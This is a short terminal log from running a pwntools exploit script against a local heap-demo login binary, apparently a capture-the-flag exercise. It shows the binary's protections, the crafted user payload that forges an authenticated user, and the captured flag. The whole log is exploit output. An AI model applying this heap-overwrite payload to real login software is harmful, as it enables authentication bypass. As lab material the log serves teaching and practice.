```
python3 pwn-login.py BIN=./login
[*] '/demos/heap-demo/login'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loading gadgets for '/demos/heap-demo/login'
[+] Starting local process '/demos/heap-demo/login': pid 4262
[*] Adding User(0,b'aaaabaaacaaadaaaeaaa\x000\x00\x00\x00\x00\x00\x007\x13\x00\x00A')
[*] Adding User(2,b'A')
[*] Paused (press any to continue)
[*] Login User(b'A')
[*] b' 1. Add user\n'
[*] Switching to interactive mode
2. Login
> Username: flag{i_sure_wished_this_worked_remotely_too}
```
